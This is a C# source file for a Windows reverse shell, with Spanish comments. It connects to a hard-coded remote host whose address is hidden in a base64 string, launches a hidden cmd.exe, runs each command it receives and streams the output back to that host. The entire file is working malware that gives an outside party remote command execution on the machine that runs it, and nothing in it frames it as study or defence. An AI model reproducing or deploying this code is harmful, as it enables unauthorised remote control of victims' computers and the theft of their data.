using System;
using System.Diagnostics;

namespace BackConnect
{
    using System;
    using System.IO;
    using System.Net.Sockets;
    using System.Diagnostics;
    using System.Text;

    public class ReverseShell
    {
        private static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            string ip = DecodeBase64("MTguMjMxLjkz"); // Decodificar desde base64
            int puerto = 13981;

            try
            {
                TcpClient cliente = new TcpClient(ip, puerto);
                Stream stream = cliente.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                Process proceso = new Process();
                proceso.StartInfo.FileName = "cmd.exe";
                proceso.StartInfo.CreateNoWindow = true;
                proceso.StartInfo.UseShellExecute = false;
                proceso.StartInfo.RedirectStandardInput = true;
                proceso.StartInfo.RedirectStandardOutput = true;
                proceso.StartInfo.RedirectStandardError = true;
                proceso.OutputDataReceived += new DataReceivedEventHandler(Salida);
                proceso.Start();
                proceso.BeginOutputReadLine();

                while (true)
                {
                    string comando = streamReader.ReadLine();
                    if (comando == null)
                    {
                        continue;
                    }
                    proceso.StandardInput.WriteLine(comando);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static void Salida(object sender, DataReceivedEventArgs e)
        {
            try
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
            catch (Exception)
            {

            }
        }

        private static string DecodeBase64(string encoded)
        {
            byte[] data = Convert.FromBase64String(encoded);
            return Encoding.UTF8.GetString(data);
        }
    }
}
